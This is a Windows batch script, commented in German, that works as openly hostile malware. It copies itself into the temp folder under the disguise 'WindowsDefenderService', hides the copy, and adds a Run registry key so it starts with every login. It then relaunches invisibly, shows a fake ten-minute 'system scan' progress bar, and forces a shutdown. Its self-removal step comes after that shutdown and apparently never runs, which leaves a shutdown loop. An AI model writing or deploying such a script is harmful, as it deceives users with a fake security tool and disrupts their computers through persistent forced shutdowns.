@echo off
:: Phase 1: Tarnung als Systemdienst
copy "%0" "%TEMP%\WindowsDefenderService.bat" >nul
attrib +h +s "%TEMP%\WindowsDefenderService.bat"

:: Phase 2: Autostart-Installation (Registry)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "DefenderService" /t REG_SZ /d "\"%TEMP%\WindowsDefenderService.bat\"" /f >nul

:: Phase 3: Unsichtbare Ausführung
if not "%1"=="stealth" (
    PowerShell -Command "Start-Process -WindowStyle Hidden -FilePath '%~f0' -ArgumentList 'stealth'"
    exit
)

:: Phase 4: Countdown (10 Minuten)
PowerShell -Command "$duration=600; $startTime=Get-Date; while((Get-Date) -lt $startTime.AddSeconds($duration)) { $remaining=[math]::Round(($duration - (Get-Date - $startTime).TotalSeconds)); Write-Progress -Activity 'Systemscan läuft' -Status \"$remaining Sekunden verbleibend\" -PercentComplete (($duration-$remaining)/$duration*100); Start-Sleep -Seconds 1 }"

:: Phase 5: Herunterfahren
shutdown /s /f /t 0

:: Phase 6: Selbstentfernung beim nächsten Start
set "CLEANUP_SCRIPT=%TEMP%\Cleanup.bat"
echo @echo off > "%CLEANUP_SCRIPT%"
echo timeout /t 5 >nul >> "%CLEANUP_SCRIPT%"
echo reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "DefenderService" /f >> "%CLEANUP_SCRIPT%"
echo del "%TEMP%\WindowsDefenderService.bat" >> "%CLEANUP_SCRIPT%"
echo del "%CLEANUP_SCRIPT%" >> "%CLEANUP_SCRIPT%"

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "Cleanup" /t REG_SZ /d "\"%CLEANUP_SCRIPT%\"" /f >nul